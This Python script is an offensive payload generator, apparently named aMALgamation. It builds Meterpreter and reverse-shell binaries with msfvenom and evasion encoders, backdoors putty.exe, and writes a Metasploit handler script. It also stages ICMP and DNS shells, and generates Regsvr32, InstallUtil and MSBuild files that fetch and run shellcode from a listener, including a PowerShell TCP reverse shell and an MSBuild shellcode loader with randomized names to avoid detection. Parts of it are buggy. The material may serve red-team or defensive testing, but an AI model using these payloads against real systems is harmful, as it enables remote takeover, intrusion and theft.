#! usr/bin/env python3

import time
import os
import sys
import netifaces as nic
import random
import string
import base64
import argparse
import shutil
import subprocess

class bcolors:
  BLUE = '\033[94m'
  GREEN = '\033[92m'
  WARNING = '\033[93m'
  WHITE = '\033[97m'
  ERROR = '\033[91m'
  ENDC = '\033[0m'
  BOLD = '\033[1m'
  UNDERLINE = '\033[4m'


#Loopback ip
listener_ip = "127.0.0.1"
#assumed wired interface
interface = "eth0"
#Malware output file
targetfile = "./aMALgamation/current/"
# 32 bit MET Port
METRT32_PORT = "443"
# 32 bit MET Stageless Port
METRT32_SL_PORT = "444"
# 64 bit MET Port
METRT64_PORT = "8443"
# 64 bit MET Stageless Port
METRT64_SL_PORT = "8444"
# 32 bit SHELL Port
SHELL32_PORT = "8080"
# 64 bit SHELL Port
SHELL64_PORT = "8181"
# 32 bit SHELL Stageless Port
SHELL32_SL_PORT = "8081"
# 64 bit SHELL Stageless Port
SHELL64_SL_PORT = "8282"
# Python MET Port
METPY_PORT = "88"
# Python SHELL Port
SHELLPY_PORT = "89"
# OSX 32 bit SHELL Port
SHELLOS32_PORT = "98"
# OSX 64 bit SHELL Port
SHELLOS64_PORT = "99"



# 32 bit MET payload
METRT32_Payload = "windows/meterpreter/reverse_tcp"
# 32 bit MET Stageless payload
METRT32_SL_Payload = "windows/meterpreter_reverse_tcp"
# 64 bit MET payload
METRT64_Payload = "windows/x64/meterpreter/reverse_tcp"
# 64 bit MET Stageless payload
METRT64_SL_Payload = "windows/x64/meterpreter_reverse_tcp"
# 32 bit SHELL payload
SHELL32_Payload = "windows/shell/reverse_tcp"
# 64 bit SHELL payload
SHELL64_Payload = "windows/x64/shell/reverse_tcp"
# 32 bit SHELL Stageless payload
SHELL32_SL_Payload = "windows/shell_reverse_tcp"
# 64 bit SHELL Stageless payload
SHELL64_SL_Payload = "windows/x64/shell_reverse_tcp"
# Python MET payload
METPY_Payload = "python/meterpreter/reverse_tcp"
# Python SHELL payload
SHELLPY_Payload = "python/shell/reverse_tcp"
# OSX 32 bit SHELL payload
SHELLOS32_Payload = "osx/x86/shell_reverse_tcp"
# OSX 64 bit SHELL payload
SHELLOS64_Payload = "osx/x64/shell_reverse_tcp"




#Createing the output file
if not os.path.exists(targetfile):
    os.makedirs(targetfile)


#archive the old version
today = time.strftime("%Y%m%d-%H%M")


archivefolder = "./aMALgamation/archive" + today
try:
    os.makedirs(archivefolder)
except OSError as e:
    if e.errno != errno.EEXIST:
        raise
files = os.listdir(targetfile)
for f in files:
    shutil.move(targetfile+f, archivefolder)
#Random Strings
def randomString(stringLength=6):
  letters = string.ascii_letters
  return ''.join(random.choice(letters) for i in range(stringLength))

def get_local_ip(iface):
  try:
    nic.ifaddresses(iface)
    local_ip = nic.ifaddresses(iface)[2][0]['addr']
    return local_ip
  except:
    pass

def rc_file():
  global listener_ip

  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating MSF Resource Script...")
  msf_resource_file = open(targetfile + "ALL-Payloads.rc", "w")
  msf_resource_file.write("""use multi/handler
set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

""" % (METRT32_Payload, listener_ip, METRT32_PORT, METRT32_SL_Payload, listener_ip,  METRT32_SL_PORT, METRT64_Payload, listener_ip, METRT64_PORT, METRT64_SL_Payload, listener_ip, METRT64_SL_PORT, SHELL32_Payload, listener_ip, SHELL32_PORT, SHELL32_SL_Payload, listener_ip, SHELL32_SL_PORT, SHELL64_Payload, listener_ip, SHELL64_PORT, SHELL64_SL_Payload, listener_ip, SHELL64_SL_PORT, METPY_PORT, listener_ip, METPY_Payload, SHELLPY_Payload, listener_ip, SHELLPY_PORT, SHELLOS32_Payload, listener_ip, SHELLOS32_PORT, SHELLOS64_Payload, listener_ip, SHELLOS64_PORT ))
  msf_resource_file.close()



##  32 bit MSFVenom MeterpreterShell
def gen_000():
  global listener_ip
  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating the 32bit Meterpreter Payloads NOW!" + bcolors.ENDC)
  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 001-stageless-32bit payload -------")
  os.system("msfvenom -p " + METRT32_SL_Payload + " LHOST=" + listener_ip + " LPORT=" + METRT32_SL_PORT + " --platform win -a x86 -e x86/shikata_ga_nai -f exe >" + targetfile + "001-SL-MET.exe")

  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 002-stageless-32bit-putty payload -------")
  os.system("msfvenom -p " + METRT32_SL_Payload + " LHOST=" + listener_ip + " LPORT=" + METRT32_SL_PORT + " --platform win -a x86 -e x86/shikata_ga_nai -x ./src/putty.exe -k -f exe >" + targetfile + "002-SL-MET-Putty.exe")

  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 003-stageless-32bit-VBA payload -------")
  os.system("msfvenom -p " + METRT32_SL_Payload + " LHOST=" + listener_ip + " LPORT=" + METRT32_SL_PORT + " --platform win  -a x86 -e x86/shikata_ga_nai -f vba >" + targetfile + "003-SL-MET.vba")


##  64 bit MSFVenom MeterpreterShell
def gen_010():
  global listener_ip
  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating the 64bit Meterpreter Payloads NOW!" + bcolors.ENDC)
  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 010-stageless-64bit payload -------")
  os.system("msfvenom -p " + METRT64_SL_Payload + " LHOST=" + listener_ip + " LPORT=" + METRT64_SL_PORT + " --platform win -a x64 -e  x64/xor -i 3 -f exe >" + targetfile + "010-SL-MET.exe")

  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 011-stageless-64bit-putty payload -------")
  os.system("msfvenom -p " + METRT64_SL_Payload + " LHOST=" + listener_ip + " LPORT=" + METRT64_SL_PORT + " --platform win  -a x64 -e  x64/xor -i 3 -x ./src/putty.exe -k -f exe >" + targetfile + "011-SL-MET-Putty.exe")

  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 012-stageless-64bit-VBS payload -------")
  os.system("msfvenom -p " + METRT64_SL_Payload + " LHOST=" + listener_ip + " LPORT=" + METRT64_SL_PORT + " --platform win  -a x64 -e  x64/xor -i 3 -f vbs >" + targetfile + "012-SL-MET.vbs")

  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 013-stageless-64bit-VBA payload -------")
  os.system("msfvenom -p " + METRT64_SL_Payload + " LHOST=" + listener_ip + " LPORT=" + METRT64_SL_PORT + " --platform win  -a x64 -e  x64/xor -i 3 -f vba >" + targetfile + "013-SL-MET.vba")


##  64 bit MSFVenom Basic Shell
def gen_020():
  global listener_ip
  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating the 64bit SHELL  Payloads NOW!" + bcolors.ENDC)
  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 020-stageless-64bit payload -------")
  os.system("msfvenom -p " + SHELL64_SL_Payload + " LHOST=" + listener_ip + " LPORT=" + SHELL64_SL_PORT + " --platform win -a x64 -e  x64/xor -i 3 -f exe-only >" + targetfile + "020-SL-Shell.exe")

  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 021-stageless-64bit-putty payload -------")
  os.system("msfvenom -p " + SHELL64_SL_Payload + " LHOST=" + listener_ip + " LPORT=" + SHELL64_SL_PORT + " --platform win  -a x64 -e  x64/xor -i 3 -x ./src/putty.exe -k -f exe-only >" + targetfile + "021-SL-Shell-Putty.exe")

  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 022-stageless-64bit-VBS payload -------")
  os.system("msfvenom -p " + SHELL64_SL_Payload + " LHOST=" + listener_ip + " LPORT=" + SHELL64_SL_PORT + " --platform win  -a x64 -e  x64/xor -i 3 -f vbs >" + targetfile + "022-SL-Shell.vbs")

  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 023-stageless-64bit-VBA payload -------")
  os.system("msfvenom -p " + SHELL64_SL_Payload + " LHOST=" + listener_ip + " LPORT=" + SHELL64_SL_PORT + " --platform win  -a x64 -e  x64/xor -i 3 -f vba >" + targetfile + "013-SL-Shell.vba")


##  Python Shells
def gen_100():
  global listener_ip
  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating Python  Payloads NOW!" + bcolors.ENDC)
  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 100-Staged-MET-Python payload -------")
  os.system("msfvenom -p " + METPY_Payload + " LHOST=" + listener_ip + " LPORT=" + METPY_PORT + " --platform Python -a python  >" + targetfile + "100-python-met.py")

  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 100-Staged-SHELL-Python payload -------")
  os.system("msfvenom -p " + SHELLPY_Payload + " LHOST=" + listener_ip + " LPORT=" + SHELLPY_PORT + " --platform Python -a python  >" + targetfile + "100-python-met.py")



##  32 bit MAC  MSFVenom  MeterpreterShell
def gen_200():
  global listener_ip
  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating OSX 32bit  Payloads NOW!" + bcolors.ENDC)
  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 200 32bit OSX payload -------")
  os.system("msfvenom -p " + SHELLOS32_Payload + " LHOST=" + listener_ip + " LPORT=" + SHELLOS32_PORT + " --platform OSX -a x86  -f macho  >" + targetfile + "200-OSX-Shell.macho")

  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 201 32bit OSX VBA payload -------")
  os.system("msfvenom -p " + SHELLOS32_Payload + " LHOST=" + listener_ip + " LPORT=" + SHELLOS32_PORT + " --platform OSX -a x86  -f vba  >" + targetfile + "201-OSX-Shell.vba")


##  64 bit MAC  MSFVenom  MeterpreterShell
def gen_210():
  global listener_ip
  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating OSX 64bit  Payloads NOW!" + bcolors.ENDC)
  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 210 64bit OSX payload -------")
  os.system("msfvenom -p " + SHELLOS64_Payload + " LHOST=" + listener_ip + " LPORT=" + SHELLOS64_PORT + " --platform OSX -a x64  -f macho  >" + targetfile + "210-OSX-Shell.macho")

  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 211 64bit OSX VBA payload -------")
  os.system("msfvenom -p " + SHELLOS64_Payload + " LHOST=" + listener_ip + " LPORT=" + SHELLOS64_PORT + " --platform OSX -a x64 -b  -f vba  >" + targetfile + "211-OSX-Shell.vba")


##  ICMP and DNS Connections/Shell
def gen_300():
  global listener_ip
  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating ICMP & DNS  Payloads NOW!" + bcolors.ENDC)
  print("\tChecking if icmpsh is installed")
  icmpsh = "/opt/icmpsh"
  if not os.path.exists(icmpsh):
      print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Installing ICMPSH NOW ------>")
      os.system("cd /opt/ && git clone https://github.com/inquisb/icmpsh.git")

  print("\tChecking if Nishang is installed")
  nishang = "/opt/nishang"
  if not os.path.exists(nishang):
      print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Installing NISHANG NOW ------>")
      os.system("cd /opt/ && git clone https://github.com/samratashok/nishang.git")

  print("\tChecking if DNSCat2 is installed")
  dnscat2 = "/opt/dnscat2"
  if not os.path.exists(dnscat2):
      print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Installing DNSCat2 NOW ------>")
      os.system("cd /opt/ && git clone https://github.com/iagox86/dnscat2.git")
      os.system("cd /opt/dnscat2/server/ && gem install bundler && bundle install")
  print("\tMoving files!!")
  os.system("cp ./src/icmpsh.sh " + targetfile + "300-ICMP-Listener.sh")
  os.system("cp ./src/DNScat2-SERVER.sh " + targetfile + "301-DNScat2-Listener.sh")
  os.system("cp ./src/icmpsh.exe " + targetfile + "302-icmpsh.exe")
  os.system("cp ./src/dnscat2.exe " + targetfile + "303-dnscat2.exe")
  os.system("cp /opt/nishang/Shells/Invoke-PowerShellIcmp.ps1 " + targetfile + "304-Invoke-PowerShellIcmp.ps1")
  os.system("cp ./src/dnscat2.ps1 " + targetfile + "305-Invoke-DNSc.ps1")

  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating icmpsh BAT file...")
  icmpsh_bat_file = open(targetfile + "306-ICMPSH.bat", "w")
  icmpsh_bat_file.write("""cmd /k 302-icmpsh.exe -t %s -d 500 -b 30 -s 128
""" % listener_ip)
  icmpsh_bat_file.close()

  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating icmpsh PS HowTo file...")
  icmpsh_ps_file = open(targetfile + "307-ICMPSH-ps.txt", "w")
  icmpsh_ps_file.write("""NOTE: Below are the commands to input into PS. If PS does not work move on to PowerShell_ISE or PowerShell 86.

powershell.exe -NoProfile -ExecutionPolicy Bypass

Import-Module ./304-Invoke-PowerShellIcmp.ps1

Invoke-PowerShellIcmp -IPAddress %s

""" % listener_ip)
  icmpsh_ps_file.close()

  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating DNSCat2 BAT file...")
  dnscat_bat_file = open(targetfile + "308-DNSCat.bat", "w")
  dnscat_bat_file.write("""cmd /k 303-dnscat2.exe --dns server=%s,port=53 --secret=password
""" % listener_ip)
  dnscat_bat_file.close()



##  regsrv32 32 bit Meterpreter DLL EVADE
def gen_320():
  global listener_ip
  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating the 32bit Meterpreter RegSrv32  Payloads NOW!" + bcolors.ENDC)
  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 320 32bit Base64 payload -------")
  os.system("msfvenom -p " + METRT32_Payload + " CMD=calc.exe LHOST=" + listener_ip + " LPORT=" + METRT32_PORT + " --platform win -a x86 EXITFUNC=thread -f raw 2>/dev/null  | base64 >" + targetfile + "320-MET32.b64")


  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit Reg MET  BAT file...")
  metreg32_bat_file = open(targetfile + "321-Reg-Met-32.bat", "w")
  metreg32_bat_file.write("""cmd /k c:\Windows\System32\Regsvr32.exe /s /i:shellcode,http://%s/320-MET32.b64 322-WEV_x86.dll
""" % listener_ip)
  metreg32_bat_file.close()

  print("\tMoving files!!")
  os.system("cp ./src/WEV_x86.dll " + targetfile + "322-WEV_x86.dll")

##  regsrv32 64 bit Meterpreter DLL EVADE
def gen_330():
  global listener_ip
  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating the 64bit Meterpreter RegSrv32  Payloads NOW!" + bcolors.ENDC)
  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 330 64bit Base64 payload -------")
  os.system("msfvenom -p " + METRT64_Payload + " CMD=calc.exe LHOST=" + listener_ip + " LPORT=" + METRT64_PORT + "  --platform win -a x64 EXITFUNC=thread -f raw 2>/dev/null | base64 >" + targetfile + "330-MET64.b64")


  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 64 bit Reg MET  BAT file...")
  metreg64_bat_file = open(targetfile + "331-Reg-Met-64.bat", "w")
  metreg64_bat_file.write("""cmd /k c:\Windows\SysWoW64\Regsvr32.exe /s /i:shellcode,http://%s/330-MET64.b64 332-WEV_x64.dll
""" % listener_ip)
  metreg64_bat_file.close()

  print("\tMoving files!!")
  os.system("cp ./src/WEV_x64.dll " + targetfile + "332-WEV_x64.dll")


##  regsrv32 32 bit Shell DLL EVADE
def gen_340():
  global listener_ip
  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating the 32bit SHELL RegSrv32  Payloads NOW!" + bcolors.ENDC)
  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 340 32bit Base64 payload -------")
  os.system("msfvenom -p " + SHELL32_Payload + " CMD=calc.exe LHOST=" + listener_ip + " LPORT=" + SHELL32_PORT + "  --platform win -a x86 EXITFUNC=thread  -f raw 2>/dev/null | base64 >" + targetfile + "340-SHELL32.b64")


  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit Reg MET  BAT file...")
  shellreg32_bat_file = open(targetfile + "341-Reg-SHELL-32.bat", "w")
  shellreg32_bat_file.write("""cmd /k c:\Windows\System32\Regsvr32.exe /s /i:shellcode,http://%s/340-SHELL32.b64 322-WEV_x86.dll
""" % listener_ip)
  shellreg32_bat_file.close()


##  regsrv32 64 bit Shell DLL EVADE
def gen_350():
  global listener_ip
  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating the 64bit SHELL RegSrv32  Payloads NOW!" + bcolors.ENDC)
  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 350 64bit Base64 payload -------")
  os.system("msfvenom -p " + SHELL64_Payload + " CMD=calc.exe LHOST=" + listener_ip + " LPORT=" + SHELL64_PORT + "  --platform win -a x64 EXITFUNC=thread -f raw 2>/dev/null | base64 >" + targetfile + "350-SHELL64.b64")


  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 64 bit Reg Shell  BAT file...")
  shellreg64_bat_file = open(targetfile + "351-Reg-Met-64.bat", "w")
  shellreg64_bat_file.write("""cmd /k c:\Windows\SysWoW64\Regsvr32.exe /s /i:shellcode,http://%s/350-SHELL64.b64 332-WEV_x64.dll
""" % listener_ip)
  shellreg64_bat_file.close()


##  32 bit regsrv32 32 bit Shell DLL EVADE PS Empire
def gen_360():
  global listener_ip
  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating 32bit PowerShell Empire RegSrv32  Payloads NOW!" + bcolors.ENDC)
  empire = "/opt/Empire"
  if not os.path.exists(empire):
      print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Installing PS Empire NOW ------>")
      os.system("cd /opt/ && git clone https://github.com/EmpireProject/Empire.git")
      os.system("/opt/Empire/setup/install.sh")

  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit Reg PS Empire  BAT file...")
  psreg32_bat_file = open(targetfile + "361-Reg-Empire-32.bat", "w")
  psreg32_bat_file.write("""cmd /k c:\Windows\System32\Regsvr32.exe /s /i:shellcode,http://%s/360-Empire.b64 322-WEV_x86.dll
""" % listener_ip)
  psreg32_bat_file.close()


  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Creatingi PS Empire  Howto file...")
  pshtreg32_bat_file = open(targetfile + "362-Reg-Empire-HowTo.txt", "w")
  pshtreg32_bat_file.write("""
cd /opt/Empire
./empire
listeners
uselistener http
set Host %s
set Port 4444
set Name http
execute
back
launcher powershell http
(Copy all of the base64 encoded data. It is the data following -enc)

In another window
cd /opt/malwaredefense/current
nano 360-Empire.b64
(Paste copied base64 string and save)

(Launch Batch file on target computer and wait for a connection within Empire)
""" % listener_ip)
  pshtreg32_bat_file.close()

##  Installme
def gen_400():
  global listener_ip
  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating the  InstallUtil  Payloads NOW!" + bcolors.ENDC)
  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 400 32bit Base64 payload -------")
  os.system("msfvenom -p " + SHELL32_Payload + " CMD=calc.exe LHOST=" + listener_ip + " LPORT=" + SHELL32_PORT + " --platform win -a x86 EXITFUNC=thread -f raw  | base64 >" + targetfile + "400-SHELL32.b64")


  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit InstallUtil SHELL BAT file...")
  SHELLINST_bat_file = open(targetfile + "402-InstallUtil-Shell.bat", "w")
  SHELLINST_bat_file.write(r"cmd /k c:\Windows\Microsoft.NET\Framework\v4.0.30319\Installutil.exe /u /f=http://"+listener_ip+r"/400-SHELL32.b64 402-installme_x86.dll")
  SHELLINST_bat_file.close()

  print("\tMoving files!!")
  os.system("cp ./src/installme_x86.dll " + targetfile + "402-installme_x86.dll")

  namespace = randomString(9)
  classname = randomString(9)
  pclassname = randomString(9)
  statename = randomString(8)
  runspacename = randomString(8)
  SMA_DLL = "'./src/System.Management.Automation.dll'"

  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating  InstallUtil PowerShell CSharp file...")

  pscsinst = "using System;\n"
  pscsinst += "using System.Management.Automation;\n"
  pscsinst += "namespace {0}\n".format(namespace)
  pscsinst += "{\n"
  pscsinst += "\tclass {0}\n".format(classname)
  pscsinst += "\t{\n"
  pscsinst += "\t\tstatic void Main(string[] args)\n"
  pscsinst += "\t\t{\n"
  pscsinst += "\t\t}\n"
  pscsinst += "\t}\n"
  pscsinst += "}\n"
  pscsinst += "[System.ComponentModel.RunInstaller(true)]\n"
  pscsinst += "\tpublic class {0} : System.Configuration.Install.Installer\n".format(pclassname)
  pscsinst += "\t{\n"
  pscsinst += "\t\tpublic override void Uninstall(System.Collections.IDictionary {0})\n".format(statename)
  pscsinst += "\t\t{\n"
  pscsinst += "\t\t\tPowerShell {0} = PowerShell.Create();\n".format(runspacename)
  pscsinst += '\t\t\t\t{0}.AddCommand("Invoke-Expression");\n'.format(runspacename)
  pscsinst += "\t\t\t\t{0}.AddArgument(\"$client = New-Object System.Net.Sockets.TCPClient".format(runspacename) +  "(\'" + listener_ip + "\'," + SHELL32_PORT + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\");\n"
  pscsinst += "\t\t\t\t{0}.Invoke();\n".format(runspacename)
  pscsinst += "\t\t}\n\n"
  pscsinst += "\t}"

  psinst_cs_file = open(targetfile + "403-PS-installutil.cs", "w")
  psinst_cs_file.write(pscsinst)
  psinst_cs_file.close()

  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating  InstallUtil PowerShell exe file...")
  os.system("mcs -platform:x86 -target:winexe -r:System.Configuration.Install,System.Windows.Forms," + SMA_DLL + " " + targetfile + "403-PS-installutil.cs -out:" + targetfile + "403-PS-installutil.exe")

  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit InstallUtil PowerShell BAT file...")
  psinst_bat_file = open(targetfile + "404-InstallUtil-PS.bat", "w")
  psinst_bat_file.write(r"cmd /k c:\Windows\Microsoft.NET\Framework\v4.0.30319\Installutil.exe /logfile= /logtoconsole=false 403-PS-installutil.exe")
  psinst_bat_file.close()
  print(bcolors.ERROR + bcolors.BOLD + "***THE InstallUtil PowerShell Payload has errors***" + bcolors.ENDC)
  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 405 32bit MET Base64 payload -------")
  os.system("msfvenom -p " + METRT32_Payload + " CMD=calc.exe LHOST=" + listener_ip + " LPORT=" + METRT32_PORT + " --platform win -a x86 EXITFUNC=thread -f raw  | base64 >" + targetfile + "405-MET32.b64")


  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit InstallUtil MET BAT file...")
  SHELLINST_bat_file = open(targetfile + "406-InstallUtil-MET.bat", "w")
  SHELLINST_bat_file.write(r"cmd /k c:\Windows\Microsoft.NET\Framework\v4.0.30319\Installutil.exe /u /f=http://"+listener_ip+r"/405-MET32.b64 402-installme_x86.dll")
  SHELLINST_bat_file.close()


##  MSBuild
def gen_410():
  global listener_ip
  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating MSBuild payloads  NOW!" + bcolors.ENDC)
  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating  MSBuild MET XML file...")
  getdataname = randomString(9)
  targetname = randomString(7)
  classname = randomString(10)
  injectName = randomString(8)
  hostName = randomString(12)
  portName = randomString(9)
  ipName = randomString()
  sockName = randomString(8)
  length_rawName = randomString(11) 
  lengthName = randomString(9)
  sName1 = randomString(10)
  total_bytesName = randomString(7)
  handleName = randomString(8)
  sName2 = randomString()
  funcAddrName = randomString()
  hThreadName = randomString()
  threadIdName = randomString()
  pinfoName = randomString()
  sName3 = randomString()
  y = [randomString(8) for x in range(17)]
  msbmet = """<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n<!-- C:\Windows\Microsoft.NET\Framework\\v4.0.30319\msbuild.exe SimpleTasks.csproj -->\n\t<Target Name="{0}">
            <{1} /> 
          </Target>
          <UsingTask
            TaskName="{1}"
            TaskFactory="CodeTaskFactory"
            AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
            <Task>

              <Code Type="Class" Language="cs">
              <![CDATA[
""".format(targetname, classname)
  msbmet += "using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices; using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;\n"
  msbmet += "public class %s : Task, ITask {\n" % (classname)
  msbmet += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 HeapCreate(UInt32 %s, UInt32 %s, UInt32 %s); \n[DllImport(\"kernel32\")] private static extern UInt32 HeapAlloc(UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 RtlMoveMemory(UInt32 %s, byte[] %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s, IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);"""%(y[0],y[1],y[2],y[3],y[4],y[5],y[6],y[7],y[8],y[9],y[10],y[11],y[12],y[13],y[14],y[15],y[16])
  msbmet += "static byte[] %s(string %s, int %s) {\n" %(getdataname, hostName, portName)
  msbmet += "    IPEndPoint %s = new IPEndPoint(IPAddress.Parse(%s), %s);\n" %(ipName, hostName, portName)
  msbmet += "    Socket %s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\n" %(sockName)
  msbmet += "    try { %s.Connect(%s); }\n" %(sockName, ipName)
  msbmet += "    catch { return null;}\n"
  msbmet += "    byte[] %s = new byte[4];\n" %(length_rawName)
  msbmet += "    %s.Receive(%s, 4, 0);\n" %(sockName, length_rawName)
  msbmet += "    int %s = BitConverter.ToInt32(%s, 0);\n" %(lengthName, length_rawName)
  msbmet += "    byte[] %s = new byte[%s + 5];\n" %(sName1, lengthName)
  msbmet += "    int %s = 0;\n" %(total_bytesName)
  msbmet += "    while (%s < %s)\n" %(total_bytesName, lengthName)
  msbmet += "    { %s += %s.Receive(%s, %s + 5, (%s - %s) < 4096 ? (%s - %s) : 4096, 0);}\n" %(total_bytesName, sockName, sName1, total_bytesName, lengthName, total_bytesName, lengthName, total_bytesName)
  msbmet += "    byte[] %s = BitConverter.GetBytes((int)%s.Handle);\n" %(handleName, sockName)
  msbmet += "    Array.Copy(%s, 0, %s, 1, 4); %s[0] = 0xBF;\n" %(handleName, sName1, sName1)
  msbmet += "    return %s;}\n" %(sName1)
  msbmet += "static void %s(byte[] %s) {\n" %(injectName, sName2)
  msbmet += "    if (%s != null) {\n" %(sName2)
  msbmet += '       UInt32 {} = HeapCreate(0x00040000, (UInt32){}.Length, 0);\n'.format(pinfoName, sName2)
  msbmet += '       UInt32 {} = HeapAlloc({}, 0x00000008, (UInt32){}.Length);\n'.format(funcAddrName, pinfoName, sName2)
  msbmet += '       RtlMoveMemory({}, {}, (UInt32){}.Length);\n'.format(funcAddrName, sName2, sName2)
  msbmet += '       UInt32 {} = 0;\n'.format(threadIdName)
  msbmet += '       IntPtr {} = CreateThread(0, 0, {}, IntPtr.Zero, 0, ref {});\n'.format(hThreadName, funcAddrName, threadIdName)
  msbmet += '       WaitForSingleObject({}, 0xFFFFFFFF);}}}}\n'.format(hThreadName)
  msbmet += 'public override bool Execute()\n'
  msbmet += '{\n'
  msbmet += "    byte[] %s = null; %s = %s(\"%s\", %s);\n" %(sName3, sName3, getdataname, listener_ip, METRT32_PORT)
  msbmet += "    %s(%s);\n" %(injectName, sName3)
  msbmet += "return true;            }       }\n"
  msbmet += "                                ]]>\n"
  msbmet += "                        </Code>\n"
  msbmet += "                </Task>\n"
  msbmet += "        </UsingTask>\n"
  msbmet += "</Project>"

  msbmet_xml_file = open(targetfile + "410-MSBuild-MET.xml", "w")
  msbmet_xml_file.write(msbmet)
  msbmet_xml_file.close()

  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit MSBuild MET BAT file...")
  msbmet_bat_file = open(targetfile + "411-MSBuild-MET.bat", "w")
  msbmet_bat_file.write(r"cmd /k c:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe 410-MSBuild-MET.xml")
  msbmet_bat_file.close()

